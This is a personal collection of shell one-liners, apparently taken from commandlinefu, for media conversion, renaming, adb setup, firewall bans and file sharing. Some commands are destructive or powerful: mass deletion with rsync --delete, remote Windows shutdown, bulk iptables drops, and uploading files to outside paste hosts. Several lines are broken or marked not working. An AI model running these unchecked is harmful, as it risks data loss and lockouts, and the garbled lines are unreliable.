## When "FileName" has not been changed for last 10 seconds, then print "DONE"
## "10" in "(stat)[10]" means ctime.
## One have other options like atime, mtime and others. http://perldoc.perl.org/functions/stat.html
##==========================================
## Wait for file to stop changing
$> while [ $(( $(date +%s) - $(stat -c %Y FILENAME) )) -lt 10 ]; do sleep 1; done; echo DONE
## This loop will finish if a file hasnt changed in the last 10 seconds.
## It checks the files modification timestamp against the clock.
## If 10 seconds have elapsed without any change to the file, then the loop ends.
## This script will give a false positive if theres a 10 second delay between updates,
## e.g. due to network congestion
## How does it work?
## 'date +%s' gives the current time in seconds
## 'stat -c %Y' gives the files last modification time in seconds
## '$(( ))' is bashs way of doing maths
## '[ X -lt 10 ]' tests the result is Less Than 10
## otherwise sleep for 1 second and repeat
## Note: Clever as this script is, inotify is smarter.
##==========================================
## List the size (in human readable form) of all sub folders from the current location
$> du -sk -- * | sort -n | perl -pe '@SI=qw(K M G T P); s:^(\d+?)((\d\d\d)*)\s:$1." ".$SI[((length $2)/3)]."\t":e'
## Tested on MacOS and GNU/Linux.
## It works in dirs containing files starting with '-'.
## It runs 'du' only once.
## It sorts according to size.
## It treats 1K=1000 (and not 1024)
##==========================================
## Get magnet link from URL
$> curl -s http://host.net/url.html | grep magnet: | sed -r 's/.*(magnet:[^"]*).*/\1/g'
$> function magnetlink3() { curl -s $1 | grep "magnet:" | sed -r 's/.*(magnet:[^"]*).*/\1/g' | head -1 ; }
##==========================================
## Bare Metal IRC Client
$> nik=clf$RANDOM;sr=irc.efnet.org;expect -c "set timeout -1;spawn nc $sr 6666;set send_human {.1 .2 1 .2 1};expect AUTH*\n ;send -h \"user $nik * * :$nik ## commandlinefu\nnick $nik\n\"; interact -o -re (PING.:)(.*\$) {send \"PONG :\$interact_out(2,string)\"}"
## Uses the extremely cool utilities netcat and expect.
## "expect" logs in & monitors for server PING checks.
## When a PING is received it sends the PONG needed to stay connected.
## IRC commands to try: HELP, TIME, MOTD, JOIN and PRIVMSG
## The "/" in front of IRC commands are not needed, e.g. type JOIN #mygroup
## Learn about expect: http://tldp.org/LDP/LGNET/issue48/fisher.html
## The sample output shows snippets from an actual IRC session.
## Please click UP button if you like it!
##==========================================
## Remove duplicate lines whilst keeping empty lines and order
$> awk '!NF || !seen[$0]++'
##==========================================
## dynamically list open files for a given process name
$> lsof -i -n -P | grep -e "$(ps aux | grep node | grep -v grep | awk -F' ' '{print $2}' | xargs | awk -F' ' '{str = $1; for(i = 2; i < NF; i++) {str = str "\\|" $i} print str}')"
##==========================================
## Secure netcat chat - SSH
$> ssh hostname nc -l 9876
## client:
$> nc localhost 9876 ip -o -4 a s | awk -F'[ /]+' '$2!~/lo/{print $4}'
##==========================================
## set create time using file name for files pulled from android camera
$> find . -type f -exec echo -n "touch -t \`echo " \; -exec echo -n {} \; -exec echo -n " | sed -E ## 's/.*([[:digit:]]{8})_([[:digit:]]{4})([[:digit:]]{2}).*/\1\2.\3/g'\` " \; -exec echo {} \; | sh
##==========================================
## Rename file to same name plus datestamp.
$> mv -iv $FILENAME{,.$('date +%F_%T' $FILENAME)}
## FILENAME=nohup.out
$> mv -iv $FILENAME{,.$(stat -c %Y $FILENAME)}
##==========================================
## Rename file to same name plus datestamp of last modification.
$> mv -iv $FILENAME{,.$(stat -c %Z $FILENAME)}
## FILENAME=nohup.out
$> mv -iv $FILENAME{,.$(stat -c %Y $FILENAME)}
$> mv -iv $FILENAME{,.$(stat -c %y $FILENAME | awk '{print $1}')}
## Rename file to same name plus datestamp of last modification.
## Note that the -i will not help in a script. Proper error checking is required.
##==========================================
## rename all files with "?" char in name
$> find . -type f -name "*\?*" | while read f;do mv "$f" "${f//[^0-9A-Za-z.\/\(\)\ ]/_}";done
## replace all "?" characters in filename to underscore
##==========================================
## rename all dirs with "?" char in name
$> find . -type d -name "*\?*" | while read f;do mv "$f" "${f//[^0-9A-Za-z.\/\(\)\ ]/_}";done
## rename all dirs with "?" char in name, leave spaces and () in place
##==========================================
## Count the number of pages of all PDFs in current directory and all subdirs, recursively
$> find . -name "*.pdf" -exec pdftk {} dump_data output \; | grep NumberOfPages | awk '{print $1,$2}'
## using awk, changed the line given by sucotronic in command #11733 to print the first and second columns
##==========================================
## slow down/speed up video file
$> mencoder -speed 2 -o output.avi -ovc lavc -oac mp3lame input.avi
##==========================================
## starts a CGI web server
$> python2 -m CGIHTTPServer
## In case you need to test some CGI scripts this does the job. It also has the functionality of a http server.
## Enjoy!
##==========================================
## starts a python web server
$> manage.py runserver 127.0.0.1:8000
## In case you need to test some CGI scripts this does the job. It also has the functionality of a http server.
## Enjoy!
##==========================================
## Regex to reliably search a file for valid IP addresses (and external IP addresses)
$> | grep -Eoa "\b(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][## 0-9]|[01]?[0-9][0-9]?)\b"
## Command returns valid IP addresses. Append the following regex to additionally filter out NAT and reserved IP addresses
## | grep -Ev "^0|\.0[0-9]|^10\.|^127\.|^169\.|^172\.(1[6-9]|2[0-9]|3[01])|^191.168.|^2(2[4-9]|3[0-9])|^2(4[0-9]|5[0-5])"
## ifconfig
## | grep -Eoa "\b(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][## 0-9]|[01]?[0-9][0-9]?)\b"| grep -Ev "^0|\.0[0-9]|^10\.|^127\.|^169\.|^172\.(1[6-9]|2[0-9]|3[01])|^191.168.|^2(2[4-9]|3[0-9])|^2(4[0-9]|5[0-5])" | grep -## v 255
##==========================================
## dumb?
## Get all URL With Extension from File
$> cat File.txt | grep -io 'http://www.acme.com/a/files/.*.pdf'| uniq
##==========================================
## rename all images in folder with prefix of date and time from exif data
$> jhead -n%Y-%m-%d_%H-%M-%S__%f *.JPG
## jhead is required
##==========================================
## rename all images in folder with prefix of date and time from exif data
$> for i in `ls` ; do date=$(identify -format %[exif:DateTime] $i); date=${date//:/-}; date=${date// /_}; mv $i ${date}__$i; done
## imagemagick is required
$> for i in * ; do date=$(identify -format %[exif:DateTime] $i); date=${date//:/-}; date=${date// /_}; mv $i ${date}__$i; done
##==========================================
## Print the IPv4 address of a given interface
$> ip a s eth0 | sed -nr 's!.*inet ([^/]+)/.*!\1!p'
##==========================================
## convert png images to jpg and optimize them
$> ls *.png | cut -d . -f 1 | xargs -L1 -i convert -strip -interlace Plane -quality 80 {}.png {}.jpg
## optimize all png images
$> find . -name *.png | xargs optipng -nc -nb -o7 -full
##==========================================
## List all groups
$> cut -d: -f1 /etc/group | sort
##==========================================
## repeated=separate
## Find Duplicate Files (based on size first, then MD5 hash)
$> find -not -empty -type f -printf "%-30s'\t\"%h/%f\"\n" | sort -rn -t$'\t' | uniq -w30 -D | cut -f 2 -d $'\t' | xargs md5sum | sort | uniq -w32 --all-
## Finds duplicates based on MD5 sum. Compares only files with the same size. Performance improvements on:
$> find -not -empty -type f -printf "%s\n" | sort -rn | uniq -d | xargs -I{} -n1 find -type f -size {}c -print0 | xargs -0 md5sum | sort | uniq -w32 --all-
## repeated=separate
## The new version takes around 3 seconds where the old version took around 17 minutes. The bottle neck in the old command was the second find. It ## searches for the files with the specified file size. The new version keeps the file path and size from the beginning.
##==========================================
## Mount a VMware virtual disk (.vmdk) file on a Linux box
$> kpartx -av <image-flat.vmdk>; mount -o /dev/mapper/loop0p1 /mnt/vmdk
## This does not require you to know the partition offset, kpartx will find all partitions in the image and create loopback devices for them automatically. This works for all types of images (dd of hard drives, img, etc) not just vmkd. You can also activate LVM volumes in the image by running
$> vgchange -a y
## and then you can mount the LV inside the image.
## To unmount the image, umount the partition/LV, deactivate the VG for the image
$> vgchange -a n <volume_group>
## then run
$> kpartx -dv <image-flad.vmdk>
## to remove the partition mappings.
##==========================================
## Rename many files in directories and subdirectories
$> find . -type d -print0 | while read -d $'\0' dir; do cd "$dir"; echo " process $dir"; find . -maxdepth 1 -name "*.ogg.mp3" -exec rename 's/.ogg.mp3/.mp3/' {} \; ; cd -; done
## Rename many files in directories and subdirectories
##==========================================
## Convert all flac files in dir to mp3 320kbps using ffmpeg
$> for FILE in *.flac; do ffmpeg -i "$FILE" -b:a 320k "${FILE[@]/%flac/mp3}"; done;
## It loops through all files in current directory that have flac extension and converts them to mp3 files with bitrate of 320kpbs using ffmpeg and default codec.
##==========================================
##  Ban all IPs that attempted to access phpmyadmin on your site
$> grep "phpmyadmin" $path_to_access.log | grep -Po "^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}" | sort | uniq | xargs -I% sudo iptables -A INPUT -s % -j DROP
##  Cheap security bash one-liner to ban all IPs that are probably doing automated attacks.
##  Make sure your IP isnt listed before piping through iptables drop!!
##  This will first find all lines in $path_to_access.log that have phpmyadmin in them, then grep out the ip address from the start of the line,then sort and unique them,then add a rule to drop them in iptables
##  Again, just edit in echo % at the end instead of the iptables command to make sure your IP isnt in there. do not inadvertently ban your access to the server!
##  Limitations: You may need to change the grep part of the command if youre on mac or any system that doesnt have grep -P. Im not sure if all systems start with xargs, so that might need to be installed too.
##=========================================
## Work with android devices
## Get vendor ID
$> lsusb
## Bus 001 Device 008: ID 0e8d:201d MediaTek Inc.
$> lsusb | grep "YourDevice" | awk '{print $6}' | sed 's/://' | awk '{print $1}'
## OR BETTER
$> find -L /sys/bus/usb/devices -maxdepth 2 -path "*/modalias" -printf "%h\t" -exec cat {} \; | awk -F: '/icFFisc42ip0/ {print $1}' | xargs -i cat {}/idVendor | awk '{print"0x"$1}'
## Install software
$> sudo apt-get install android-tools-adb android-tools-fastboot
## Add udev rule as root
$> su
$> echo 'SUBSYSTEM=="usb", SYSFS{idVendor}=="0e8d", MODE="0666", GROUP="plugdev"' >> /etc/udev/rules.d/71-android.rule
## Add vendor ID to ~/.android/adb_usb.ini
## in this case 0x0e8d
$> echo "0x0e8d" >> ~/.android/adb_usb.ini
## or
$> find -L /sys/bus/usb/devices -maxdepth 2 -path "*/modalias" -printf "%h\t" -exec cat {} \; | awk -F: '/icFFisc42ip0/ {print $1}' | xargs -i cat {}/idVendor | awk '{print"0x"$1}' | sort -u >> ~/.android/adb_usb.ini
## Start adb
$> sudo adb kill-server
$> sudo /etc/init.d/udev restart
$> sudo adb start-server
$> sudo adb devices
## Should list your device
##------------------------------------------
## Use adb to communicate with the device
$> adb shell
##------------------------------------------
$> lsusb | grep "YourDevice" | awk '{print $6}' | sed 's/://' | awk '{print $1}'
$> lsusb | grep "MediaTek" | awk '{print $6}' | sed 's/://' | awk '{print $1}'
##------------------------------------------
$> lsusb | awk '{print $8}'
##------------------------------------------
## Take screenshot of Android device using adb and save to filesystem
$> adb shell screencap -p | sed 's/\r$//' > FILENAME.PNG
##------------------------------------------
$> function idVendor () { find -L /sys/bus/usb/devices -maxdepth 2 -path "*/modalias" -printf "%h\t" -exec cat {} \; | awk -F: '/icFFisc42ip0/ {print $1}' | xargs -i cat {}/idVendor | awk '{print"0x"$1}' ; }
##==========================================
#$> echo "https://www.google.com/maps/place/$(exiftool -ee -p '$gpslatitude, $gpslongitude' -c "%d?%d'%.2f"\" image.jpg 2> /dev/null | sed -e "s/ //g")"
## Generate a Google maps URL for GPS location data from digital photo
## This command uses the "exiftool" command which is available here: http://www.sno.phy.queensu.ca/~phil/exiftool/
##==========================================
#$> echo "https://www.google.com/maps/place/$(exiftool -ee -p '$gpslatitude, $gpslongitude' -c "%d?%d'%.2f"\" image.jpg 2> /dev/null | sed -e "s/ //g")"
# Generate a Google maps URL for GPS location data from digital photo
# This command uses the "exiftool" command which is available here: http://www.sno.phy.queensu.ca/~phil/exiftool/
# NB, there should be a degree symbol right after the first "%d" NOT a question mark.
# For some unknown reason, commandlinefu is not able to handle degree symbol correctly ("?")?
##==========================================
$> rsync -a --delete empty-dir/ target-dir/
## Optimal way of deleting huge numbers of files
## This command works by rsyncing the target directory (containing the files you want to delete) with an empty directory. The '--delete' switch instructs rsync to remove files that are not present in the source directory. Since there are no files there, all the files will be deleted.
## Im not clear on why its faster than find -delete, but it is.
## Benchmarks here: https://web.archive.org/web/20130929001850/http://linuxnote.net/jianingy/en/linux/a-fast-way-to-remove-huge-number-of-files.html
##==========================================
$> "SELECT strftime('%d.%m.%Y %H:%M:%S', dateAdded/1000000, 'unixepoch', 'localtime'),url FROM moz_places, moz_bookmarks WHERE moz_places.id = moz_bookmarks.fk ORDER BY dateAdded;"; done
## get all bookmarks from all profiles from firefox
$> for i in $(ls /home/marco/.mozilla/firefox/*\.*/places.sqlite); do sqlite3 $i "SELECT strftime('%d.%m.%Y %H:%M:%S', dateAdded/1000000, 'unixepoch', 'localtime'),url FROM moz_places, moz_bookmarks WHERE moz_places.id = moz_bookmarks.fk ORDER BY dateAdded;"; done
##==========================================
## Show running services (using systemctl)
$> command systemctl --no-page --no-legend --plain -t service --state=running
##==========================================
$> echo Which way up? | flip.pl | cowsay | tac | sed -e "s,/,+,g" -e "s,\\\,/,g" -e "s,+,\\\,g" -e "s,_,-,g" -e "s,\^,v,g"
## Inverted cowsay
## Its quite fun to invert text using "flip.pl" (ref: http://ubuntuforums.org/showthread.php?t=2078323 ).
## Slightly more challenging is to flip a whole "cowsay". :-)
##==========================================
$> ASN=32934; for s in $(whois -H -h riswhois.ripe.net -- -F -K -i $ASN | grep -v "^$" | grep -v "^%" | awk '{ print $2 }' ); do echo " blocking $s"; sudo iptables -A INPUT -s $s -j REJECT &> /dev/null || sudo ip6tables -A INPUT -s $s -j REJECT; done
## Block all FaceBook traffic
##==========================================
## Embed next line on the end of current line using sed (where X is the current line)
## Convert all flac files in dir to mp3 320kbps using ffmpeg
$> for FILE in *.flac; do ffmpeg -i "$FILE" -b:a 320k "${FILE[@]/%flac/mp3}"; done;
##==========================================
$> sed 'X{N;s/\n//;}' file.txt
## Embed next line on the end of current line using sed (where X is the current line)
## N: On the current line, sed will display it on pattern space, plus a \n (new line); but s/\n//: Will get rid of new line displayed on pattern space, joining the current lines end with the start of the next line
##==========================================
$> sudo mount -o remount,rw / && sudo cp /etc/hosts /etc/hosts.old && wget http://winhelp2002.mvps.org/hosts.txt && cp /etc/hosts ~/ && cat hosts.txt >> hosts && sudo cp hosts /etc/hosts
## Ad blocking on Ubuntu phone/tablet with hosts file
## Will append lines to the hosts file to do some basic ad blocking.
##==========================================
## To play on chromecast
$> avconv -i inputfile.avi  -c:v libx264 -c:a libfdk_aac outputfile.mp4
$> avconv -i inputfile.mkv  -c:v copy -c:a copy outputfile.mp4
##==========================================
# Create a test html file
$> echo "<html><body>This is a test</body></html>" > /var/www/html/index.html
##==========================================
# Remove whitespace
# Remove leading whitespace
$> sed 's/^[ \t]*//' tmp > tmp2
# Remove trailing whitespace from each line
$> sed 's/[ \t]*$//' tmp2 > tmp3
# Remove leading whitespace from file
$> awk '!d && NF {sub(/^[[:blank:]]*/,""); d=1} d' tmp4 > tmp5
# Remove blank lines from end of file
$> awk '/^[[:space:]]*$/{p++;next} {for(i=0;i<p;i++){printf "\n"}; p=0; print}' tmp5 > tmp6
##==========================================
## Searches for text in all files in the current folder -i case-insensitive -I ignore binary files -r recursive search -n causes line number to be printed
## optional: -F treat search term as a literal, not a regular expression optional: -l only print filenames and not the matching lines ex. grep -irl "$1" *
$> greptext () { grep -iIHrn --color=always "$1" . | less -r ; }
##==========================================
##
$> videnctool -compose --file=vid1.avi --start=00:00:30:12 --end=00:01:45:00 --file=vid2.avi --start=00:05:00:00 --end=00:07:12:25 --file=mypicture.png --duration=00:00:02:00 --file=vid3.avi --start=00:02:00:00 --end=00:02:45:10 --output=editedvid.avi
$> videnctool -compose --file=vid1.avi --start=00:00:01:12 --end=00:01:45:00 --output=editedvid.avi
##==========================================
$> ffmpeg -i input-file.mp4 -c:v libvpx -crf 10 -b:v 1M -c:a libvorbis output-file.webm
##==========================================
## Cut out a part starting at 00:01:30 into the original file with a 5 seconds length and that it shouldnt be reencoded (if you want to re-encode it youll have to replace copy with audio and video codecs, for a list of available audio codecs issue mencoder -oac help, for a list of available video codecs issue mencoder -ovc help), then you issue:
## mencoder
$> mencoder -ss 00:30:00 -endpos 00:00:05 -oac copy -ovc copy originalfile -o newfile
## Youll have to replace orginalfile and newfile with actual file names, the later is the name of the file that is created to hold the cut out part.
## ffmpeg
## Cut out a part starting at 00:0:30 into the original file with a 5 seconds length and that it shouldnt be re-encoded (if you want to re-encode it youll have to replace copy with audio and video codecs, for a list of available codecs issue ffmpeg -formats -E), then you issue:
$> ffmpeg -ss 00:00:30 -i orginalfile -t 00:00:05 -vcodec copy -acodec copy newfile
## Replace orginalfile and newfile with actual file names, the later is the name of the file that is created to hold the cut out part.
##==========================================
$> mencoder -ss 00:30:00 -endpos 00:00:05 -oac copy -ovc copy
##==========================================
## use FFmpeg cut mp4 video without re-encoding
## Example:
$> ffmpeg -i source.mp4 -ss 00:00:05 -t 00:00:10 -c copy cut_video.mp4
## use FFmpeg cut mp4 video with re-encoding
## Example:
$> ffmpeg -i source.mp4 -ss 00:00:05 -t 00:00:10 -async 1 -strict -2 cut_video.mp4
##==========================================
## Launch remote awesome session on Dual monitor
$> Xephyr -keybd ephyr,,,xkbmodel=evdev,xkblayout=it -listen tcp -ac -reset -output VGA1 :5
## from xfce session to avoid keyboard shortcut clashing
## start xephyr in VGA1 monitor:
$> Xephyr -keybd ephyr,,,xkbmodel=evdev,xkblayout=it -listen tcp -ac -reset -output VGA1 :5
## then start an xterm locally
$> export DISPLAY=:5.0
## xterm
## and remote ssh (no X fw needed if local tcp with access disablesd (-tcp -ac) => UNSECURE!!!
$> ssh remote-host
$> export DISPLAY=notebook:5.0
$> xrdb -merge ~/.Xresources
$> xterm -geometry 132x50-0+0
## start awesome
$> dbus-launch $(which awesome)
$> dex -a -e Awesome
##==========================================
## Simple Video Surveillance by email
$> while true ; do fswebcam -d /dev/video0 -r 1280x1024 -F 15 - | uuencode $(date +\%Y\%m\%d\%H\%M).jpeg | mail -s "Video surveillance" me@gmail.com ; sleep 300 ; done
## This takes a picture (with the web cam) every 5 minutes, and send the picture to your e-mail.
## Some systems support
## mail -a "References: "
## so that all video surveillance emails are grouped in a single email thread.
## To keep your inbox clean, it is still possible to filter and move to trash video surveillance emails (and restore these emails only if you really get robbed!)
## For instance with Gmail, emails sent to me+trash@gmail.com can be filtered with "Matches: DeliveredTo:me+trash@gmail.com"
##==========================================
##  ix is a paste website to host files usable by commandline
## Examples:
##     ix hello.txt              # paste file (name/ext will be set).
##     echo Hello world. | ix    # read from STDIN (won't set name/ext).
##     ix -n 1 self_destruct.txt # paste will be deleted after one read.
##     ix -i ID hello.txt        # replace ID, if you have permission.
##     ix -d ID
## This file at http://ix.io/yaV
#$> ix() {
#$>     local opts
#$>     local OPTIND
#$>     [ -f "$HOME/.netrc" ] && opts='-n'
#$>     while getopts ":hd:i:n:" x; do
#$>         case $x in
#$>             h) echo "ix [-d ID] [-i ID] [-n N] [opts]"; return;;
#$>             d) $echo curl $opts -X DELETE ix.io/$OPTARG; return;;
#$>             i) opts="$opts -X PUT"; local id="$OPTARG";;
#$>             n) opts="$opts -F read:1=$OPTARG";;
#$>         esac
#$>     done
#$>     shift $(($OPTIND - 1))
#$>     [ -t 0 ] && {
#$>         local filename="$1"
#$>         shift
#$>         [ "$filename" ] && {
#$>             curl $opts -F f:1=@"$filename" $* ix.io/$id
#$>             return
#$>         }
#$>         echo "^C to cancel, ^D to send."
#$>     }
#$>     curl $opts -F f:1='<-' $* ix.io/$id
#$> }
##------------------------------------------
$> ix() { local opts; local OPTIND; [ -f "$HOME/.netrc" ] && opts='-n'; while getopts ":hd:i:n:" x; do  case $x in  h) echo "ix [-d ID] [-i ID] [-n N] [opts]"; return;;  d) $echo curl $opts -X DELETE ix.io/$OPTARG; return;;  i) opts="$opts -X PUT"; local id="$OPTARG";;  n) opts="$opts -F read:1=$OPTARG";;  esac; done; shift $(($OPTIND - 1)); [ -t 0 ] && {  local filename="$1";  shift;  [ "$filename" ] && {  curl $opts -F f:1=@"$filename" $* ix.io/$id;  return;  };  echo "^C to cancel, ^D to send."; }; curl $opts -F f:1='<-' $* ix.io/$id; }
##==========================================
## Clear filesystem memory cache
$> sync && echo 3 | sudo tee /proc/sys/vm/drop_caches
## Found here: http://ubuntuforums.org/showthread.php?t=589975
##==========================================
## Get a qrcode for a given string from qrenco.de
$> echo "http://commandlinefu.com" | curl -F-=\<- qrenco.de
##==========================================
## multimedia.video. convert video to gif by ffmpeg and imagemagick
$> ffmpeg -i input.flv -vf scale=320:-1 -r 10 -f image2pipe -vcodec ppm - | convert -delay 5 -loop 0 - output.gif
## you can use any common video format. if you do not need to change the size of gif output, just remove `-vf scale=320:-1`
## btw, 320:-1 means width is 320px and height would be set automatically
##==========================================
$> sudo systemctl mask sleep.target suspend.target hibernate.target hybrid-sleep.target
## Disable sleep mode via cli and systemd (Centos, Debian Ubuntu?)
## This causes computer to never power off or go into sleep mode. Disables sleep mode linux.
##==========================================
$> pmset -g batt | awk '/^ /{print $5}'
## Display minutes remaining on Macbook battery
## Remaining battery time is displayed in minutes
##==========================================
$> printf "%x\n" $(seq 0 255) | xargs -n1 -IH echo -ne \\xH > test.dat
## Generate binary sequence data
##==========================================
$> videospeed() { vname="$1"; speedc="$2"; vs=$(python3 -c "print(1/$speedc)"); aspeed=$(python3 -c "print(1*$speedc)"); ffmpeg -i "$vname" -filter:a "atempo=$aspeed" -filter:v "setpts=$vs*PTS" "${3:-converted_$1}"; }
## Speed up or slow down video (and audio)
## videospeed video_filename speedchange newfilename
## videospeed foo.mp4 0.5 foo_slow.mp4
## Range of 0.5 (50%) - 2.0 (200%) is valid.
##==========================================
## Mac OSX
## Move a folder and merge it with another folder
$> gcp -r -l source/ destination/
## This will move a folder and merge it with another folder which may contain duplicates. Technically its just creating hardlinks of everything in the folder, and after its done, delete the source (with rm -r source/ ) to complete the move. This is much faster than, for example, using rsync to merge folders which would actually copy the entire contents and so for a lot of files would take much longer.
## This uses macutils gcp port of cp so it can be used on osx/MacOS. If using in linux or some unix where cp includes the ability to create links with -l you can just use cp instead of gcp.
##==========================================
$> tr -d '\r' < YourTextFile.txt | tr '\n' ' '
## Join lines and separate with spaces
## Read vmargs.txt, which is a text file that could either be DOS-style (\r\n) or UNIX-style (\n) line endings and join the lines with a space separator. Can this be shortened/made more elegant?
##==========================================
$> ls -lart | lolcat -a
## Slow down the screen output of a command
## (example above is the 'ls' command with reduced output speed)
##==========================================
$> id <username> | sed s/' '/'\n'/g | sed s/,/',\n '/g | sed s/'('/' ('/g | sed s/uid/' uid'/g | sed s/gid/' gid'/g | sed s/=/' = '/g
## Pretty-print user/group info for a given user
##==========================================
## Random news story dumped to terminal
$> w3m -dump `lynx -dump -listonly "http://news.google.com" | grep -Eo "(http|https)://[a-zA-Z0-9./?=_-]*" | grep -v "google.com" | sort -R | uniq | head -n1`
## or
$> links -dump $( a=( $( lynx -dump -listonly "http://news.google.com" | grep -Eo "(http|https)://[a-zA-Z0-9./?=_-]*" | grep -v "google.com" | sort | uniq ) ) ; amax=${#a[@]} ; n=$(( `date '+%s'` % $amax )) ; echo ${a[n]} )
## or
$> links -dump `lynx -dump -listonly "http://news.google.com" | grep -Eo "(http|https)://[a-zA-Z0-9./?=_-]*" | grep -v "google.com" | sort -R | uniq | head -n1`
##==========================================
$> less -X YourTextFile.txt
## Do not clear the screen after viewing a file with less
##==========================================
$> rsync -a --delete empty-dir/ target-dir/
## Optimal way of deleting huge numbers of files
## This command works by rsyncing the target directory (containing the files you want to delete) with an empty directory. The '--delete' switch instructs rsync to remove files that are not present in the source directory. Since there are no files there, all the files will be deleted.
## I'm not clear on why it's faster than 'find -delete', but it is.
## Benchmarks here: https://web.archive.org/web/20130929001850/http://linuxnote.net/jianingy/en/linux/a-fast-way-to-remove-huge-number-of-files.html
##==========================================
$> tree -isafF /var|grep -v "/$"|tr '[]' ' '|sort -k1nr|head
## Find top 10 largest files in /var directory (subdirectories and hidden files included )
## Should work even when very large files exist.
##==========================================
$> du -a /var | sort -n -r | head -n 10
## Find top 10 largest files
##==========================================
$> echo "$USER"|rev | espeak
## Your name backwards
##==========================================
## Make changes in .bashrc immediately available
$> bashrc-reload() { builtin exec bash ; }
##==========================================
## Show running services (using systemctl)
$> command systemctl --no-page --no-legend --plain -t service --state=running
# or
$> systemctl --no-page -t service -a --state running --no-legend
##==========================================
## Play streaming music on command line. Awesome!!!!
$> mplayer http://pub7.di.fm/di_ambient_aac?1 -user-agent "AudioAddict-di/3.2.0.3240 Android/5.1"
## This commands does just two things: fakes user agent (the one was taken from recent Android app) and sends the (possibly) listener ID (it can be any - I put "1" here because it works like a charm - after the name of stream ?1 as you can see).
## Look for the list of stations here: http://pub7.di.fm
## Or here: https://goo.gl/pdhhpQ
##==========================================
## convert video to gif by ffmpeg and imagemagick
$> ffmpeg -i input.flv -vf scale=320:-1 -r 10 -f image2pipe -vcodec ppm - | convert -delay 5 -loop 0 - output.gif
## you can use any common video format. if you do not need to change the size of gif output, just remove `-vf scale=320:-1`
## btw, 320:-1 means width is 320px and height would be set automatically
##==========================================
## Multiplication table The multiplication table for math study
$> for y in {1..12}; do for x in {1..12}; do echo -n "| $x*$y=$((y*x)) "; done; echo; done|column -t
## Multiplication table The multiplication table for math study
##==========================================
# Make changes in .bashrc immediately available
$> bashrc-reload() { builtin exec bash ; }
##==========================================
## Block all FaceBook traffic
$> ASN=32934; for s in $(whois -H -h riswhois.ripe.net -- -F -K -i $ASN | grep -v "^$" | grep -v "^%" | awk '{ print $2 }' ); do echo " blocking $s"; sudo iptables -A INPUT -s $s -j REJECT &> /dev/null || sudo ip6tables -A INPUT -s $s -j REJECT; done
##==========================================
$> ss -t -o state established '( dport = :443 || dport = :80 )' | grep -Po '([0-9a-z:.]*)(?=:http[s])' | sort -u|netcat whois.cymru.com 43|grep -v "AS Name"|sort -t'|' -k3
## Lookup autonomous systems of all outgoing http/s traffic
## Using GNU Grep with perl regexp (works on newer Ubuntus)
## or
$> ss -t -o state established '( dport = :443 || dport = :80 )'|grep tcp|awk '{ print $5 }'|sed s/:http[s]*//g|sort -u|netcat whois.cymru.com 43|grep -v "AS Name"|sort -t'|' -k3
# Lookup autonomous systems of all outgoing http/s traffic
##==========================================
$> for i in *.flac; do flac -d -c "${i}" |lame -h --preset 196 --ta "Artist Here" --tl "Disc Title Here" --add-id3v2 - "./MP3/$i.mp3"; done
## Transcode original FLAC files to downsampled MP3 files in exclusive folder
##==========================================
$> transfer() { basefile=$(basename "$1" | sed -e 's/[^a-zA-Z0-9._-]/-/g');curl --progress-bar --upload-file "$1" "https://transfer.sh/$basefile"|xsel --clipboard;xsel --clipboard ; }
## access to the internet(http://transfer.sh)
## This is an alias utilizing the transfer.sh service to make sharing files easier from the command line. transfer.sh uses xsel to copy the resulting URL to the clipboard.
$> transfer() { if [ $# -eq 0 ]; then echo "No arguments specified. Usage:\necho transfer /tmp/test.md\ncat /tmp/test.md | transfer test.md"; return 1; fi if tty -s; then basefile=$(basename "$1" | sed -e 's/[^a-zA-Z0-9._-]/-/g'); curl --progress-bar --upload-file "$1" "https://transfer.sh/$basefile" |xsel --clipboard; else curl --progress-bar --upload-file "-" "https://transfer.sh/$1" |xsel --clipboard ; fi; xsel --clipboard; }
##==========================================
$> get_iplayer --type=radio --channel "Radio 4 Extra" | grep : | awk '{ if ( NR > 1 ) { print } }'|sed 's/:.*//' |sed '$ d' > pidlist && while read p; do get_iplayer --get --fields=pid $p; done <pidlist && rm pidlist
## grab all m4a file from bbc radio 4 extra for some easy audio ebbok listening
## use get_iplay to download all listed content from http://www.bbc.co.uk/radio4extra run every night to make sure no episodes are missed
##==========================================
$> netstat -np | grep -v ^unix
## Examine processes generating traffic on your website
## I often have to google this so I put it here for quick reference.
##==========================================
## Replace all spaces with underscore in all files in current folder
#$> rename 's/ /_/g' *
##==========================================
# Take screenshot of Android device using adb and save to filesystem
$> adb shell screencap -p | sed 's/\r$//' > FILENAME.PNG
##==========================================
$> weather() { curl -s "http://www.wunderground.com/q/zmw:$1.1.99999" | grep "og:title" | cut -d\" -f4 | sed 's/&deg;/ degrees F/'; }
## Get simple weather info from a zip code
##==========================================
## List all the currently loaded old kernel packages, that is other than the active one
$> dpkg -l 'linux-*' | sed '/^ii/!d;/'"$(uname -r | sed "s/\(.*\)-\([^0-9]\+\)/\1/")"'/d;s/^[^ ]* [^ ]* \([^ ]*\).*/\1/;/[0-9]/!d'
##==========================================
$> net rpc shutdown -I ipAddressOfWindowsPC -U username%password
## Shutdown a Windows machine from Linux
## This will issue a shutdown command to the Windows machine. username must be an administrator on the Windows machine. Requires samba-common package installed. Other relevant commands are:
## net rpc shutdown -r : reboot the Windows machine
## net rpc abortshutdown : abort shutdown of the Windows machine
## Type:
## net rpc
## to show all relevant commands
##==========================================
## Mount folder/filesystem through SSH
$> sshfs name@server:/path/to/folder /path/to/mount/point
##==========================================
## Display a block of text with AWK
$> awk '/start_pattern/,/stop_pattern/' file.txt
##==========================================
## NOT WORKING
## save command output to png image
$> ifconfig | convert label:@- ip.png
##==========================================
## Add Password Protection to a file your editing with vim.
## While I love gpg and truecrypt theres some times when you just want to edit a file and not worry about keys or having to deal needing extra software on hand. Thus, you can use vim encrypted file format.
## For more info on vim encrypted files visit: http://www.vim.org/htmldoc/editing.html#encryption
$> vim -x <FILENAME>
##==========================================
## NO LONGER WORKS
## Google Translate.  NO LONGER WORKS
